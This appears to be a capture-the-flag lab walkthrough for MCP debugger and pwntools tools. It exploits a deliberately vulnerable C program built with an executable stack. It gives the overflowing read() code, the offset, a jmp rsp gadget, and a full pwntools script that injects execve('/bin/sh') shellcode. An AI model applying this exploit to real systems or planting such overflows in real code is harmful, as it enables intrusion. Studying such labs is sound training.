# Shellcode Injection — RWX Stack Buffer Overflow

A buffer overflow challenge where the stack is executable (`-z execstack`). The
goal is to inject shellcode that spawns a shell.

## The Binary

```c
void vuln() {
    char buf[64];
    read(0, buf, 256);  // overflow
}
```

Compiled with: `gcc -g -O0 -fno-stack-protector -no-pie -z execstack -o shellcode-injection shellcode-injection.c`

## Walkthrough

### 1. Load and check permissions

```
edb_load_program(path="/tmp/shellcode-injection")
edb_get_protected_memory_regions()
```

Look for the stack region — it must have `RWX` (read-write-execute) permissions.
Without `-z execstack`, the stack is `RW` only and shellcode injection will fail
with SIGSEGV.

### 2. Find buffer overflow offset

```
pwntools_cyclic(length=256)
```

Run the program with the cyclic pattern, note the crash address, then:

```
pwntools_cyclic_find(value="<crashed_value>")
```

This gives you 72 bytes of padding before the return address.

### 3. Find a `jmp rsp` gadget

```
edb_disassemble(location="vuln", count=15)
edb_search_pattern(pattern="ff e4")   # opcode for jmp rsp
```

`ff e4` is the encoding of `jmp rsp`. When `vuln` returns, `rsp` points just
past the return address — right where we place our shellcode.

### 4. Generate shellcode

```
pwntools_shellcode()
pwntools_disasm(code="<bytes>", vma=0, arch="amd64")
```

Use `pwntools_shellcode` to generate execve("/bin/sh") shellcode. Verify with
`pwntools_disasm` that it's valid x86-64 and doesn't contain null bytes.

### 5. Assemble and send payload

```
edb_set_breakpoint(location="vuln+38")   # after read returns
edb_run()
edb_get_registers()      # confirm rsp points to our data
edb_read_memory(address="<rsp_value>", size=32)  # verify shellcode placed
edb_write_memory(address="<addr>", data="<shellcode_hex>")
```

### 6. Continue and win

```
edb_continue()
```

You should get a shell.

## Exploit Script

```python
from pwn import *

context.arch = "amd64"
elf = ELF("/tmp/shellcode-injection")
rop = ROP(elf)
jmp_rsp = rop.find_gadget(["jmp rsp"]).address

shellcode = asm(shellcraft.sh())
payload = cyclic(72) + p64(jmp_rsp) + shellcode

p = process("/tmp/shellcode-injection")
p.send(payload)
p.interactive()
```

## MCP Tools Used

| Tool | Purpose |
|------|---------|
| `pwntools_shellcode` | Generate execve("/bin/sh") shellcode |
| `pwntools_disasm` | Verify generated shellcode bytes |
| `edb_set_breakpoint` | Set breakpoint after `read()` to inspect state |
| `edb_get_registers` | Inspect RSP after overflow |
| `edb_read_memory` | Verify shellcode placement on stack |
| `edb_write_memory` | Manually inject shellcode bytes |
| `edb_get_protected_memory_regions` | Confirm stack is RWX |
| `edb_search_pattern` | Find `jmp rsp` gadget opcode |
| `edb_continue` | Resume execution to trigger shellcode |
